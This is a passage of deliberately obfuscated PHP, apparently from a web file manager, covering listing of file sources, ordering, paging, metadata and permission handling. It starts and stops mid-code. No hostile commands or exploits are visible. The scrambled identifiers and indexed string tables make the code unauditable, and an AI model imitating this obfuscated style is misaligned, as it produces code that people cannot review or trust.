Model($àœçîë¡[437])->removeBySource($ŒÑéÌ¨); } return $¨Öó¤¶; } public function listUserRecycle() { $Î®›–°” =& $_SERVER[Å¶¨Şêº]; $…œ‹æ§¨ = Model($Î®›–°”[438])->listData(); if (!$…œ‹æ§¨) { return array(); } $‡‚ÑØ…ô = array($Î®›–°”[426] => array($Î®›–°”[427], $…œ‹æ§¨), $Î®›–°”[439] => 1); return $this->listSource($‡‚ÑØ…ô); } public function listSource($²½’É¬, $ğÛ®ÒÁ» = 3000, $Îù§ß  = false) { $¢ŒÚÕ´û =& $_SERVER[Å¶¨Şêº]; if (!isset($²½’É¬[$¢ŒÚÕ´û[440]])) { $²½’É¬[$¢ŒÚÕ´û[440]] = 0; } if (isset($²½’É¬[$¢ŒÚÕ´û[441]]) && $²½’É¬[$¢ŒÚÕ´û[441]] == $¢ŒÚÕ´û[209]) { $²½’É¬[$¢ŒÚÕ´û[421]] = array($¢ŒÚÕ´û[341], $¢ŒÚÕ´û[442]); } $®‹õ± = $¢ŒÚÕ´û[443]; $ëşªıúä = $this->field($®‹õ±)->_makeOrder()->where($²½’É¬)->selectPage($ğÛ®ÒÁ»); $this->_listPageCheck($ëşªıúä, $®‹õ±, $²½’É¬); $this->_listDataApply($ëşªıúä[$¢ŒÚÕ´û[379]], $Îù§ß ); $this->_listMake($ëşªıúä); return $ëşªıúä; } private function _listPageCheck(&$«ÈØÆ˜, $’£¨®›ß, $ÙİŞ¬¿Ì) { $¡ºæá—¿ =& $_SERVER[Å¶¨Şêº]; if (!is_array($«ÈØÆ˜[$¡ºæá—¿[376]])) { return; } $Êà€“şï = $«ÈØÆ˜[$¡ºæá—¿[376]]; if ($Êà€“şï[$¡ºæá—¿[378]] <= 1) { return; } if ($Êà€“şï[$¡ºæá—¿[377]] >= 100000) { return; } if (Model($¡ºæá—¿[444])->get($¡ºæá—¿[445]) != $¡ºæá—¿[446]) { return; } $’£¨®›ß = str_replace(array($¡ºæá—¿[63], $¡ºæá—¿[352], $¡ºæá—¿[19]), $¡ºæá—¿[12], $’£¨®›ß); $’£¨®›ß = $¡ºæá—¿[447] . str_replace($¡ºæá—¿[60], $¡ºæá—¿[448], $’£¨®›ß) . $¡ºæá—¿[449]; $ÔÈö¢¢Ì = $¡ºæá—¿[450]; $ÔÈö¢¢Ì = $ÔÈö¢¢Ì . $¡ºæá—¿[451]; $†å°–ö = $Êà€“şï[$¡ºæá—¿[373]] * ($Êà€“şï[$¡ºæá—¿[363]] - 1) . $¡ºæá—¿[60] . $Êà€“şï[$¡ºæá—¿[373]]; $î¡ˆ”½Á = $this->_makeOrder(!0); $»¬ıı« = $¡ºæá—¿[447] . str_replace($¡ºæá—¿[60], $¡ºæá—¿[448], $î¡ˆ”½Á[0]); if (strpos($»¬ıı«, $¡ºæá—¿[452])) { $»¬ıı« = str_replace($¡ºæá—¿[452], $¡ºæá—¿[453], $»¬ıı«); } else { $»¬ıı« .= $¡ºæá—¿[454] . $î¡ˆ”½Á[1]; } $ƒè“Åø = array(); foreach ($ÙİŞ¬¿Ì as $şÊ˜Û‰› => $Öò¼ç³¾) { $ƒè“Åø[$¡ºæá—¿[447] . $şÊ˜Û‰›] = $Öò¼ç³¾; } $this->alias($¡ºæá—¿[455])->field($’£¨®›ß)->limit($†å°–ö)->order($»¬ıı«); $æ×Ö¨‡‰ = $this->join($ÔÈö¢¢Ì)->where($ƒè“Åø)->select(); if ($æ×Ö¨‡‰) { $«ÈØÆ˜[$¡ºæá—¿[379]] = $æ×Ö¨‡‰; } } protected function _makeOrder($¹ç´ó§ó = false) { $…ÒÃóé§ =& $_SERVER[Å¶¨Şêº]; $”®‰¿Ÿ¡ = Model($…ÒÃóé§[456])->get($…ÒÃóé§[457]); $şø›‡” = Model($…ÒÃóé§[456])->get($…ÒÃóé§[458]); $¦¨…ÁŠ = array($…ÒÃóé§[459] => $…ÒÃóé§[460], $…ÒÃóé§[461] => $…ÒÃóé§[462]); $Ğª°â = array($…ÒÃóé§[42] => $…ÒÃóé§[42], $…ÒÃóé§[87] => $…ÒÃóé§[87], $…ÒÃóé§[185] => $…ÒÃóé§[421], $…ÒÃóé§[463] => $…ÒÃóé§[463], $…ÒÃóé§[464] => $…ÒÃóé§[465], $…ÒÃóé§[212] => $…ÒÃóé§[212], $…ÒÃóé§[96] => $…ÒÃóé§[96]); $âŸ“Ø¬ = Input::get($…ÒÃóé§[466], $…ÒÃóé§[7], $”®‰¿Ÿ¡, array_keys($Ğª°â)); $‹©‡…ß = Input::get($…ÒÃóé§[467], $…ÒÃóé§[7], $şø›‡”, array_keys($¦¨…ÁŠ)); if (!in_array($âŸ“Ø¬, array_keys($Ğª°â))) { $âŸ“Ø¬ = $…ÒÃóé§[42]; } if (!in_array($‹©‡…ß, array_keys($¦¨…ÁŠ))) { $âŸ“Ø¬ = $…ÒÃóé§[459]; } if ($âŸ“Ø¬ == $…ÒÃóé§[42]) { } $Æ¼€¸’” = $…ÒÃóé§[468] . $Ğª°â[$âŸ“Ø¬] . $…ÒÃóé§[63] . $¦¨…ÁŠ[$‹©‡…ß]; $Æ¼€¸’” = rtrim(trim($Æ¼€¸’”), $…ÒÃóé§[60]); if ($¹ç´ó§ó) { return array($Æ¼€¸’”, $¦¨…ÁŠ[$‹©‡…ß]); } return $this->order($Æ¼€¸’”); } protected function _listDataApplyItem($øä„¿‡§, $¾‚“‘Æˆ = false) { $Îê½‘Ù¨ = array($øä„¿‡§); $this->_listDataApply($Îê½‘Ù¨, $¾‚“‘Æˆ); return $Îê½‘Ù¨[0]; } protected function _listDataApply(&$Éï ß³ê, $©ßı­È = false) { $üÛ¶âÃ´ =& $_SERVER[Å¶¨Şêº]; if (!$Éï ß³ê) { $Éï ß³ê = array(); return; } $ôæëúÒŒ = array_to_keyvalue($Éï ß³ê, $üÛ¶âÃ´[12], $üÛ¶âÃ´[411]); $ôæëúÒŒ = array_unique($ôæëúÒŒ); $this->_listSourceCache($Éï ß³ê); if (!$©ßı­È) { $this->_listAppendMeta($Éï ß³ê, $ôæëúÒŒ); $this->_listAppendFileMeta($Éï ß³ê, $ôæëúÒŒ); $this->_listAppendChildren($Éï ß³ê, $ôæëúÒŒ); } $this->_listAppendPath($Éï ß³ê); $this->_listAppendAuth($Éï ß³ê); $this->_listAppendSourceInfo($Éï ß³ê, $ôæëúÒŒ); $this->_listAppendUser($Éï ß³ê); $this->_listFilterInfo($Éï ß³ê, $©ßı­È); $this->_listAppendAuthSecret($Éï ß³ê); } protected function _listSourceCache($–ˆÎÕËè) { $•±ö­ÔÈ =& $_SERVER[Å¶¨Şêº]; foreach ($–ˆÎÕËè as $˜×ÓÃ) { self::$cacheSourceInfo[$•±ö­ÔÈ[469] . $˜×ÓÃ[$•±ö­ÔÈ[411]]] = $˜×ÓÃ; } } protected function _listFilterInfo(&$ğÁ«úœ, $–Äßø  = false) { $­ÏÊî« =& $_SERVER[Å¶¨Şêº]; foreach ($ğÁ«úœ as &$‚Ó¬Ì²Ô) { $‚Ó¬Ì²Ô = $this->pathInfoFilter($‚Ó¬Ì²Ô); self::$cachePathInfo[$­ÏÊî«[470] . intval($–Äßø ) . $­ÏÊî«[395] . $‚Ó¬Ì²Ô[$­ÏÊî«[411]]] = $‚Ó¬Ì²Ô; } unset($‚Ó¬Ì²Ô); } protected function _listMake(&$»î¢âÑå) { $ßìÑâÓ =& $_SERVER[Å¶¨Şêº]; $»î¢âÑå[$ßìÑâÓ[93]] = array(); $»î¢âÑå[$ßìÑâÓ[94]] = array(); foreach ($»î¢âÑå[$ßìÑâÓ[379]] as $€á×Äš) { $ì¤£ÂÜÍ = $€á×Äš[$ßìÑâÓ[419]] == 1 ? $ßìÑâÓ[93] : $ßìÑâÓ[94]; $»î¢âÑå[$ì¤£ÂÜÍ][] = $€á×Äš; } unset($»î¢âÑå[$ßìÑâÓ[379]]); } protected function _listAppendMeta(&$Úˆº¬º‰, $¢¶ëšû‰) { $—‘™‰ñÙ =& $_SERVER[Å¶¨Şêº]; $òÌ…Ñ«÷ = array($—‘™‰ñÙ[426] => array($—‘™‰ñÙ[427], $¢¶ëšû‰)); $›é„Áõ = Model($—‘™‰ñÙ[471])->field($—‘™‰ñÙ[472])->where($òÌ…Ñ«÷)->select(); if (!$›é„Áõ) { return; } $ÒâÈŠÛÚ = array($—‘™‰ñÙ[473], $—‘™‰ñÙ[474], $—‘™‰ñÙ[453]); $Šë¯Úè  = array(); foreach ($›é„Áõ as $ÍÇí‘Üì) { if (!isset($Šë¯Úè [$ÍÇí‘Üì[$—‘™‰ñÙ[411]]])) { $Šë¯Úè [$ÍÇí‘Üì[$—‘™‰ñÙ[411]]] = array(); } if (in_array($ÍÇí‘Üì[$—‘™‰ñÙ[105]], $ÒâÈŠÛÚ)) { continue; } $Šë¯Úè [$ÍÇí‘Üì[$—‘™‰ñÙ[411]]][$ÍÇí‘Üì[$—‘™‰ñÙ[105]]] = $ÍÇí‘Üì[$—‘™‰ñÙ[384]]; } foreach ($Úˆº¬º‰ as &$­µ°ãú) { $­µ°ãú[$—‘™‰ñÙ[475]] = !1; if (isset($Šë¯Úè [$­µ°ãú[$—‘™‰ñÙ[411]]])) { $­µ°ãú[$—‘™‰ñÙ[475]] = $Šë¯Úè [$­µ°ãú[$—‘™‰ñÙ[411]]]; } if ($this->fileIsLock($­µ°ãú) && $­µ°ãú[$—‘™‰ñÙ[422]]) { $´´Š÷ëé = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $­µ°ãú[$—‘™‰ñÙ[422]][$—‘™‰ñÙ[423]] = AuthModel::authDisable($­µ°ãú[$—‘™‰ñÙ[422]][$—‘™‰ñÙ[423]], $´´Š÷ëé); $­µ°ãú[$—‘™‰ñÙ[422]][$—‘™‰ñÙ[476]][$—‘™‰ñÙ[422]] = $­µ°ãú[$—‘™‰ñÙ[422]][$—‘™‰ñÙ[423]]; } } unset($­µ°ãú); } protected function _listAppendFileMeta(&$ƒ™„Œ…Å, $½À¯Ñ»Á) { $½“¾Şö =& $_SERVER[Å¶¨Şêº]; $âôãè¦ = array_to_keyvalue($ƒ™„Œ…Å, $½“¾Şö[12], $½“¾Şö[477]); $âôãè¦ = array_filter(array_unique($âôãè¦)); if (!$âôãè¦) { return; } $óÜü¼âÜ = array($½“¾Şö[478] => array($½“¾Şö[427], $âôãè¦)); $Ë‘¿¾îŞ = $½“¾Şö[479]; $²¡Ú´ç = Model($½“¾Şö[480])->field($Ë‘¿¾îŞ)->where($óÜü¼âÜ)->select(); $²¡Ú´ç = array_to_keyvalue($²¡Ú´ç, $½“¾Şö[477]); $ÖñİŸì… = Model($½“¾Şö[481])->field($½“¾Şö[482])->where($óÜü¼âÜ)->select(); $ÖñİŸì… = $ÖñİŸì… ? $ÖñİŸì… : array(); $µÃŠØ˜Ì = array(); foreach ($ÖñİŸì… as $Ğà¯ï¤Ã) { if (!isset($µÃŠØ˜Ì[$Ğà¯ï¤Ã[$½“¾Şö[477]]])) { $µÃŠØ˜Ì[$Ğà¯ï¤Ã[$½“¾Şö[477]]] = array(); } $µÃŠØ˜Ì[$Ğà¯ï¤Ã[$½“¾Şö[477]]][$Ğà¯ï¤Ã[$½“¾Şö[105]]] = $Ğà¯ï¤Ã[$½“¾Şö[384]]; } foreach ($ƒ™„Œ…Å as &$ê³•öâß) { $Ş×Èğóï = $ê³•öâß[$½“¾Şö[477]]; if (!$Ş×Èğóï || !is_array($²¡Ú´ç[$Ş×Èğóï])) { continue; } $éÆ‘Æè = $²¡Ú´ç[$Ş×Èğóï]; $éÆ‘Æè[$½“¾Şö[87]] = $ê³•öâß[$½“¾Şö[87]]; $éÆ‘Æè[$½“¾Şö[42]] = $ê³•öâß[$½“¾Şö[42]]; if (!isset(self::$cacheFileInfo[$½“¾Şö[483] . $Ş×Èğóï])) { self::$cacheFileInfo[$½“¾Şö[483] . $Ş×Èğóï] = array_merge(array(), $éÆ‘Æè); } unset($²¡Ú´ç[$Ş×Èğóï][$½“¾Şö[95]]); $óâÆ‰Èá = is_array($µÃŠØ˜Ì[$Ş×Èğóï]) ? $µÃŠØ˜Ì[$Ş×Èğóï] : array(); $ê³•öâß[$½“¾Şö[181]] = array_merge($óâÆ‰Èá, $²¡Ú´ç[$Ş×Èğóï]); if (isset($ê³•öâß[$½“¾Şö[181]][$½“¾Şö[180]])) { $ê³•öâß[$½“¾Şö[180]] = json_decode($ê³•öâß[$½“¾Şö[181]][$½“¾Şö[180]], !0); unset($ê³•öâß[$½“¾Şö[181]][$½“¾Şö[180]]); } } unset($ê³•öâß); } protected function _listAppendSourceInfo(&$ô«ı‹©Ü, $ã¤£­€Ò) { $’±úû„ =& $_SERVER[Å¶¨Şêº]; $¬ğéÈŠ¯ = Model($’±úû„[484])->listData(); $€°¯åìÌ = Model($’±úû„[434])->listData(); $¬üÆáÎò = Model($’±úû„[424])->listData(); $˜¿µ‹Î˜ = Model($’±úû„[485])->listSimple(); $ªÔÑãÓ = array_to_keyvalue($¬ğéÈŠ¯, $’±úû„[408]); $„şÊÎŒ¨ = array_to_keyvalue_group($€°¯åìÌ, $’±úû„[95], $’±úû„[435]); $¦Œ¾­‹º = array_to_keyvalue($¬üÆáÎò, $’±úû„[95]); $¤ı„ïêÕ = array_to_keyvalue_group($˜¿µ‹Î˜, $’±úû„[411]); foreach ($ô«ı‹©Ü as &$Ÿ¶²˜Ê–) { $Ÿ¶²˜Ê–[$’±úû„[98]] = array($’±úû„[486] => 0, $’±úû„[487] => 0, $’±úû„[488] => 0); if (isset($¦Œ¾­‹º[$Ÿ¶²˜Ê–[$’±úû„[411]]])) { $Ÿ¶²˜Ê–[$’±úû„[98]][$’±úû„[489]] = 1; $Ÿ¶²˜Ê–[$’±úû„[98]][$’±úû„[490]] = $¦Œ¾­‹º[$Ÿ¶²˜Ê–[$’±úû„[411]]][$’±úû„[42]]; } if ($„şÊÎŒ¨ && $ªÔÑãÓ && isset($„şÊÎŒ¨[$Ÿ¶²˜Ê–[$’±úû„[411]]])) { $Ÿ¶²˜Ê–[$’±úû„[98]][$’±úû„[491]] = array(); foreach ($„şÊÎŒ¨[$Ÿ¶²˜Ê–[$’±úû„[411]]] as $šŠê¿ö¢) { $¸Òğ¾Ä— = $ªÔÑãÓ[$šŠê¿ö¢]; $Ÿ¶²˜Ê–[$’±úû„[98]][$’±úû„[491]][] = array($’±úû„[492] => $¸Òğ¾Ä—[$’±úû„[408]], $’±úû„[429] => $¸Òğ¾Ä—[$’±úû„[42]], $’±úû„[493] => $¸Òğ¾Ä—[$’±úû„[494]]); } } if ($¤ı„ïêÕ && isset($¤ı„ïêÕ[$Ÿ¶²˜Ê–[$’±úû„[411]]])) { $Ÿ¶²˜Ê–[$’±úû„[98]][$’±úû„[495]] = array(); foreach ($¤ı„ïêÕ[$Ÿ¶²˜Ê–[$’±úû„[411]]] as $ë¢ò‚ìÆ) { $Í©ÒÍÔñ = $’±úû„[496]; if ($ë¢ò‚ìÆ[$’±úû„[497]] == $’±úû„[99]) { $Í©ÒÍÔñ .= $’±úû„[498]; } $Ÿ¶²˜Ê–[$’±úû„[98]][$’±úû„[495]] = array_field_key($ë¢ò‚ìÆ, explode($’±úû„[60], $Í©ÒÍÔñ)); } } } unset($Ÿ¶²˜Ê–); return $ô«ı‹©Ü; } protected function _listAppendChildren(&$ø°£¤›¿, $Ã”ÙØ‚Ñ) { $ÕÅƒÖ¹Ÿ =& $_SERVER[Å¶¨Şêº]; $ÓÂôŸ®Ù = array(); $×€½èÖ¾ = array($ÕÅƒÖ¹Ÿ[218] => 0, $ÕÅƒÖ¹Ÿ[219] => 0); foreach ($ø°£¤›¿ as &$Òß¬ä¦ú) { if (!$Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[419]]) { continue; } $ÓÂôŸ®Ù[] = $Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[411]]; } unset($Òß¬ä¦ú); if (!$ÓÂôŸ®Ù) { return; } $×´Ô›É = array($ÕÅƒÖ¹Ÿ[441] => array($ÕÅƒÖ¹Ÿ[7], $ÓÂôŸ®Ù), $ÕÅƒÖ¹Ÿ[440] => 0); $ç„æ™Ö = array($ÕÅƒÖ¹Ÿ[441], $ÕÅƒÖ¹Ÿ[419], $ÕÅƒÖ¹Ÿ[499] => $ÕÅƒÖ¹Ÿ[500]); $–±åîû = $this->field($ç„æ™Ö)->where($×´Ô›É)->group($ÕÅƒÖ¹Ÿ[501])->select(); $£ûÀÑ² = array(); foreach ($–±åîû as $¥Á¯Û³) { $“‹ÉŒ÷ë = $¥Á¯Û³[$ÕÅƒÖ¹Ÿ[441]]; $Øß•‰å = $¥Á¯Û³[$ÕÅƒÖ¹Ÿ[419]] == $ÕÅƒÖ¹Ÿ[99] ? $ÕÅƒÖ¹Ÿ[219] : $ÕÅƒÖ¹Ÿ[218]; if (!isset($£ûÀÑ²[$“‹ÉŒ÷ë])) { $£ûÀÑ²[$“‹ÉŒ÷ë] = array($ÕÅƒÖ¹Ÿ[218] => 0, $ÕÅƒÖ¹Ÿ[219] => 0); } $£ûÀÑ²[$“‹ÉŒ÷ë][$Øß•‰å] += $¥Á¯Û³[$ÕÅƒÖ¹Ÿ[500]]; } foreach ($ø°£¤›¿ as &$Òß¬ä¦ú) { if (!$Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[419]]) { continue; } $ĞÎÖè¯ã = is_array($£ûÀÑ²[$Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[411]]]) ? $£ûÀÑ²[$Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[411]]] : $×€½èÖ¾; $Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[219]] = $ĞÎÖè¯ã[$ÕÅƒÖ¹Ÿ[219]]; $Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[218]] = $ĞÎÖè¯ã[$ÕÅƒÖ¹Ÿ[218]]; unset($Òß¬ä¦ú[$ÕÅƒÖ¹Ÿ[421]]); } unset($Òß¬ä¦ú); } protected function _listAppendAuth(&$Ÿã¼¼·) { $Š…âóëÓ =& $_SERVER[Å¶¨Şêº]; $Ê¨ÀøÀ› = array(); foreach ($Ÿã¼¼· as $¯ˆ¬£…ˆ) { if ($¯ˆ¬£…ˆ[$Š…âóëÓ[420]] == self::TYPE_GROUP) { $Ê¨ÀøÀ›[] = $¯ˆ¬£…ˆ[$Š…âóëÓ[411]]; } } if (!$Ê¨ÀøÀ›) { return; } $ˆ—ÉÎ = array_to_keyvalue($Ÿã¼¼·, $Š…âóëÓ[411]); $ü¦§¿š— = Model($Š…âóëÓ[502])->getSourceList($Ê¨ÀøÀ›, $ˆ—ÉÎ); $¹Ãª´Ş‡ = $GLOBALS[$Š…âóëÓ[503]] == 1; foreach ($Ÿã¼¼· as $áÃ§áÛö => &$¯ˆ¬£…ˆ) { $¯ˆ¬£…ˆ[$Š…âóëÓ[422]] = $ü¦§¿š—[$¯ˆ¬£…ˆ[$Š…âóëÓ[411]]]; if (!$¯ˆ¬£…ˆ[$Š…âóëÓ[422]] && $¯ˆ¬£…ˆ[$Š…âóëÓ[420]] == self::TYPE_GROUP) { $¯ˆ¬£…ˆ[$Š…âóëÓ[422]] = Action($Š…âóëÓ[504])->pathGroupAuthMake($¯ˆ¬£…ˆ[$Š…âóëÓ[505]]); if (!$¯ˆ¬£…ˆ[$Š…âóëÓ[422]] && !$¹Ãª´Ş‡) { $¯ˆ¬£…ˆ[$Š…âóëÓ[214]] = !1; $¯ˆ¬£…ˆ[$Š…âóëÓ[213]] = !1; } } if ($¯ˆ¬£…ˆ[$Š…âóëÓ[422]]) { $¯ˆ¬£…ˆ[$Š…âóëÓ[214]] = AuthModel::authCheckEdit($¯ˆ¬£…ˆ[$Š…âóëÓ[422]][$Š…âóëÓ[423]]); $¯ˆ¬£…ˆ[$Š…âóëÓ[213]] = AuthModel::authCheckView($¯ˆ¬£…ˆ[$Š…âóëÓ[422]][$Š…âóëÓ[423]]); } $this->groupPathDisplay($¯ˆ¬£…ˆ); } unset($¯ˆ¬£…ˆ); } public function _listAppendAuthSecret(&$¥âĞå”Ö) { $ª®õ”ÓÍ =& $_SERVER[Å¶¨Şêº]; if (Model($ª®õ”ÓÍ[444])->get($ª®õ”ÓÍ[506]) != $ª®õ”ÓÍ[99]) { return; } static $ÉÔö¿æ = false; if (!$ÉÔö¿æ) { $ÀÊŸíµ´ = Model($ª®õ”ÓÍ[507]); $˜‰Ğ‰Çß = Model($ª®õ”ÓÍ[508]); $ÉÔö¿æ = $˜‰Ğ‰Çß->listData(); $ÉÔö¿æ = array_to_keyvalue($ÉÔö¿æ, $ª®õ”ÓÍ[411]); $Šš”Ú©¾ = json_decode(Model($ª®õ”ÓÍ[444])->get($ª®õ”ÓÍ[509]), !0); $Šš”Ú©¾ = array_to_keyvalue($Šš”Ú©¾, $ª®õ”ÓÍ[408]); foreach ($ÉÔö¿æ as $ïÈò«‡± => $áéå·ĞÈ) { $¢åßÎ = $Šš”Ú©¾[$áéå·ĞÈ[$ª®õ”ÓÍ[510]]]; if (!$¢åßÎ) { $˜‰Ğ‰Çß->remove($áéå·ĞÈ[$ª®õ”ÓÍ[408]]); unset($ÉÔö¿æ[$ïÈò«‡±]); continue; } $µ©—ñªÉ = $ÀÊŸíµ´->listData($¢åßÎ[$ª®õ”ÓÍ[422]]); if (!$µ©—ñªÉ) { $˜‰Ğ‰Çß->remove($áéå·ĞÈ[$ª®õ”ÓÍ[408]]); unset($ÉÔö¿æ[$ïÈò«‡±]); continue; } $áéå·ĞÈ[$ª®õ”ÓÍ[422]] = $µ©—ñªÉ; $áéå·ĞÈ[$ª®õ”ÓÍ[511]] = $¢åßÎ; $áéå·ĞÈ[$ª®õ”ÓÍ[512]] = Model($ª®õ”ÓÍ[513])->getInfoSimpleOuter($áéå·ĞÈ[$ª®õ”ÓÍ[463]]); $ÉÔö¿æ[$ïÈò«‡±] = $áéå·ĞÈ; } } $ëú°È = USER_ID; $á°µ—„ = array(); $ÇˆÌğ…µ = $this->_listAppendPath($á°µ—„, !0); foreach ($¥âĞå”Ö as $ïÈò«‡± => &$áéå·ĞÈ) { if (!is_array($áéå·ĞÈ[$ª®õ”ÓÍ[422]])) { continue; } if ($áéå·ĞÈ[$ª®õ”ÓÍ[420]] != $ª®õ”ÓÍ[514]) { continue; } if (isset($ÉÔö¿æ[$áéå·ĞÈ[$ª®õ”ÓÍ[411]]])) { $ò“Ã‘¯Ë = $ÉÔö¿æ[$áéå·ĞÈ[$ª®õ”ÓÍ[411]]]; if (!is_array($áéå·ĞÈ[$ª®õ”ÓÍ[475]])) { $áéå·ĞÈ[$ª®õ”ÓÍ[475]] = array(); } $áéå·ĞÈ[$ª®õ”ÓÍ[475]][$ª®õ”ÓÍ[515]] = $ò“Ã‘¯Ë[$ª®õ”ÓÍ[510]]; $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[516]] = $ò“Ã‘¯Ë; $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[517]] = $áéå·ĞÈ[$ª®õ”ÓÍ[518]]; $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[519]] = $ª®õ”ÓÍ[99]; if ($ò“Ã‘¯Ë[$ª®õ”ÓÍ[463]] != $ëú°È) { $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[423]] = $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[423]] & $ò“Ã‘¯Ë[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[422]]; } continue; } $¢Ò‡ÔîÛ = $this->parentLevelArray($áéå·ĞÈ[$ª®õ”ÓÍ[520]]); $â‹ª = array_reverse($¢Ò‡ÔîÛ); foreach ($â‹ª as $ó»Ñ°¬  => $îï›­¶) { if (!isset($ÉÔö¿æ[$îï›­¶])) { continue; } $ò“Ã‘¯Ë = $ÉÔö¿æ[$îï›­¶]; $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[516]] = $ò“Ã‘¯Ë; if ($ò“Ã‘¯Ë[$ª®õ”ÓÍ[463]] != $ëú°È) { $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[423]] = $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[423]] & $ò“Ã‘¯Ë[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[422]]; } $Í€î™Ãª = $ª®õ”ÓÍ[12]; $ñäŞÄÄî = count($¢Ò‡ÔîÛ) - $ó»Ñ°¬ ; for ($ªêœ–Åò = 0; $ªêœ–Åò < $ñäŞÄÄî; $ªêœ–Åò++) { if (!isset($ÇˆÌğ…µ[$¢Ò‡ÔîÛ[$ªêœ–Åò]])) { $Í€î™Ãª = $ª®õ”ÓÍ[12]; break; } $Í€î™Ãª = $Í€î™Ãª . rtrim($ÇˆÌğ…µ[$¢Ò‡ÔîÛ[$ªêœ–Åò]], $ª®õ”ÓÍ[8]) . $ª®õ”ÓÍ[8]; } $áéå·ĞÈ[$ª®õ”ÓÍ[422]][$ª®õ”ÓÍ[517]] = rtrim($Í€î™Ãª, $ª®õ”ÓÍ[8]) . $ª®õ”ÓÍ[8]; break; } } unset($áéå·ĞÈ); } public function groupPathDisplay(&$Úü³Ã¨Ÿ) { $³¶¬®Ì• =& $_SERVER[Å¶¨Şêº]; if ($Úü³Ã¨Ÿ[$³¶¬®Ì•[420]] != self::TYPE_GROUP) { return; } $ ÌÚÇ©ä = Model($³¶¬®Ì•[521])->getInfo($Úü³Ã¨Ÿ[$³¶¬®Ì•[505]]); $‘Ïèü« = $this->parentLevelArray($ ÌÚÇ©ä[$³¶¬®Ì•[520]]); $Çû·ÎÖº = $³¶¬®Ì•[12]; foreach ($‘Ïèü« as $Æ¹¼÷à°) { $×„í˜ÇÎ = Model($³¶¬®Ì•[521])->getInfo($Æ¹¼÷à°); $Çû·ÎÖº .= $×„í˜ÇÎ[$³¶¬®Ì•[98]][$³¶¬®Ì•[411]] . $³¶¬®Ì•[60]; } $Úü³Ã¨Ÿ[$³¶¬®Ì•[522]] = $ ÌÚÇ©ä[$³¶¬®Ì•[441]]; $Úü³Ã¨Ÿ[$³¶¬®Ì•[523]] = $ ÌÚÇ©ä[$³¶¬®Ì•[520]]; $Úü³Ã¨Ÿ[$³¶¬®Ì•[524]] = $ ÌÚÇ©ä[$³¶¬®Ì•[525]]; $Úü³Ã¨Ÿ[$³¶¬®Ì•[526]] = $Çû·ÎÖº . $ ÌÚÇ©ä[$³¶¬®Ì•[98]][$³¶¬®Ì•[411]]; } protected function _listAppendPath(&$÷­¢Ã, $´âáêË¶ = false) { $´°¨ôÇ =& $_SERVER[Å¶¨Şêº]; static $®—×‰˜ò = array(); $ª®¨ùÇ = array(); $ßÍ“œË¹ = array(); if ($´âáêË¶) { return $®—×‰˜ò; } foreach ($÷­¢Ã as &$ºêƒ¿ñ) { $ëŸë²´Ë = $ºêƒ¿ñ[$´°¨ôÇ[411]]; if ($ºêƒ¿ñ[$´°¨ôÇ[419]] == $´°¨ôÇ[99] && $ºêƒ¿ñ[$´°¨ôÇ[441]] != 0) { $®—×‰˜ò[$ëŸë²´Ë] = $ºêƒ¿ñ[$´°¨ôÇ[42]]; } if ($ºêƒ¿ñ[$´°¨ôÇ[419]] == $´°¨ôÇ[99] && $ºêƒ¿ñ[$´°¨ôÇ[441]] == 0 && !isset($®—×‰˜ò[$ëŸë²´Ë])) { $®—×‰˜ò[$ëŸë²´Ë] = $this->_listAppendPathRoot($ºêƒ¿ñ, array()); } if (isset($ßÍ“œË¹[$ºêƒ¿ñ[$´°¨ôÇ[520]]])) { continue; } $ßÍ“œË¹[$ºêƒ¿ñ[$´°¨ôÇ[520]]] = !0; $è¿üÔÉ• = $this->parentLevelArray($ºêƒ¿ñ[$´°¨ôÇ[520]]); foreach ($è¿üÔÉ• as $¦û¦”ö => $¬ØÚğ›¯) { if (isset($®—×‰˜ò[$¬ØÚğ›¯])) { continue; } if ($¦û¦”ö == 0) { $®—×‰˜ò[$¬ØÚğ›¯] = $this->_listAppendPathRoot($ºêƒ¿ñ, $è¿üÔÉ•); } if ($¦û¦”ö != 0) { $ª®¨ùÇ[] = $¬ØÚğ›¯; } } } unset($ºêƒ¿ñ); $ª®¨ùÇ = array_unique($ª®¨ùÇ); if (count($ª®¨ùÇ) > 0) { $ğˆÊµÒê = array($´°¨ôÇ[426] => array($´°¨ôÇ[427], $ª®¨ùÇ)); if (count($ª®¨ùÇ) == 1) { $³ÛÙßŒï = $this->sourceInfo($ª®¨ùÇ[0]); $ÇæÕí„« = is_array($³ÛÙßŒï) ? array($³ÛÙßŒï) : !1; } else { $ÇæÕí„« = $this->field($´°¨ôÇ[527])->where($ğˆÊµÒê)->select(); } if (!$ÇæÕí„«) { $ÇæÕí„« = array(); } foreach ($ÇæÕí„« as $Ì½ÄëÕà) { $®—×‰˜ò[$Ì½ÄëÕà[$´°¨ôÇ[411]]] = $Ì½ÄëÕà[$´°¨ôÇ[42]]; } } $ö£æ¸¡š = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Š•Ÿ­Ó£ = array(); foreach ($÷­¢Ã as &$ºêƒ¿ñ) { $¥×âƒù = $ºêƒ¿ñ[$´°¨ôÇ[520]]; $Ç€œ™‰á = $´°¨ôÇ[12]; if (isset($Š•Ÿ­Ó£[$¥×âƒù])) { $Ç€œ™‰á = $Š•Ÿ­Ó£[$¥×âƒù]; } else { $è¿üÔÉ• = $this->parentLevelArray($ºêƒ¿ñ[$´°¨ôÇ[520]]); foreach ($è¿üÔÉ• as $¦û¦”ö => $¬ØÚğ›¯) { if 